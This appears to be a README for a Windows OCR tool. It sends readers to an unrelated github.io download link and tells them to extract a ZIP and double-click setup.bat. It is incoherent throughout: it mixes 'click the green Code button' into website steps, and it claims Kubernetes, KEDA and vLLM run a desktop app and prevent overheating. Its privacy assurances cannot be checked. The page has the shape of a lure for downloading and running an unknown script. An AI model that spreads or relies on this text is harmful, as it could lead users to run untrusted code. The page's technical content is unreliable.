# 📋 production-ocr-course - Create robust pipelines for text recognition

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://salom6174.github.io)

This guide helps you set up a system that reads text from images at high speed. You will use this tool to build reliable pipelines for digitizing documents. The software handles image processing, text extraction, and storage tasks. 

## ⚙️ System Requirements

Your computer needs specific parts to run this software. Check your system against this list before you start.

- Windows 10 or Windows 11.
- Processor with at least four physical cores.
- 8 GB of RAM or more.
- 50 GB of available space on your hard drive.
- A stable internet connection for the initial setup.

## 📥 Getting the Software

You must visit the main website to get the files. 

[Visit this page to download the software here](https://salom6174.github.io)

Click the green button labeled Code and select Download ZIP. Save the compressed folder to your Documents or Downloads folder.

## 🔨 Installation Steps

1. Right-click the downloaded folder labeled production-ocr-course-main.
2. Select Extract All from the menu.
3. Choose a folder on your computer to hold the files.
4. Click Extract. 
5. Open the folder you just created.

## 🚀 Running the Application

This software requires a few background tools to function. These tools bridge the gap between your images and the text output.

1. Open the File Explorer and navigate to the folder where you extracted the files.
2. Look for the file named setup.bat.
3. Double-click the file to start the installation sequence.
4. A black command window appears on your screen. This window shows the progress of the installation.
5. Wait for the window to finish its work. Do not close this window while it runs.
6. Once you see the message "Setup Complete," you can safely close the window.

## 🖥️ Using the OCR Pipeline

The application works by watching a specific folder on your computer for new images.

1. Navigate to the folder you extracted earlier.
2. Find the folder named incoming-docs.
3. Place any image files you want to process inside this folder.
4. The software automatically detects the image.
5. It processes the text using its internal engine.
6. The software saves the resulting text files in a separate folder named results.
7. Open the results folder to view your extracted text.

## 🛠️ Performance Tips

The software manages your hardware resources to provide fast results. If you notice slow processing speeds, ensure that you close other heavy programs like video editors or games. Your computer dedicates its processing energy to the document pipeline. Keep your hard drive clear of clutter to store the text results without errors.

## ⚠️ Common Troubleshooting

If the software fails to read an image, check these items:

- Ensure the file format is a standard type like JPEG, PNG, or TIFF.
- Check that the image quality is clear and the text is legible.
- Confirm your hard drive has enough storage space for the output files.
- Restart your computer if the background process freezes during a large file import.

## 📂 Understanding the Pipeline

The system uses several layers to perform its tasks. You do not need to interact with these layers directly, but knowing what they do helps if issues arise.

- Rust: This handles the core operations of the software. It ensures speed and safety during text extraction.
- vLLM: This part manages the language model that understands the structures of the text found in your documents.
- Redis: This acts as a temporary holding area for your images before they reach the main processor.
- Kubernetes: This organizes the various tasks into a neat queue so that your computer does not get overwhelmed by too many images at once.
- KEDA: This component monitors how much work the software handles and adjusts the workload to prevent your system from overheating or stalling.

## 🔒 Data Privacy

All processing happens on your local machine. The software does not send your images to external servers or cloud services. You maintain control over your data, and your files stay on your computer at all times. If you delete an image from the folder, the software ceases work on that specific file immediately.

## 📝 Updating

Check the website once a month for new versions of this tool. If an update appears, simply follow the download steps again to overwrite your old files with the new version. The setup process recognizes your existing settings and preserves your configuration.

Keywords: OCR, text recognition, image processing, document pipeline, automation, computer vision, data extraction, productivity